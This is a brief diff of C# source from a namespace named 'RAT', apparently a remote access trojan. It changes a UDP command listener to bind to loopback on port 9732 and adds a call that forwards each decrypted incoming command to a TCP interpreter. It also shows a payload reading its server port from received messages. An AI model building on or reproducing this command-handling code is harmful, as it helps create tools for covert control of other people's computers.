@@ -73,7 +73,7 @@ namespace RAT
 
             public void Receive(IAsyncResult ar)
             {
-                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 9732);
+                IPEndPoint ip = new IPEndPoint(IPAddress.Loopback, 9732);
                 byte[] bytes = udp.EndReceive(ar, ref ip);
                 string message = Encoding.ASCII.GetString(bytes);
                 commands(Crypto.Decrypt(message));
@@ -89,6 +89,7 @@ namespace RAT
             {
                 Payload.port = Int32.Parse(message.Substring(message.IndexOf("<SERVERPORT>") + 13));
             }
+            TCPInterpreter.main(message);
         }
         }
     }
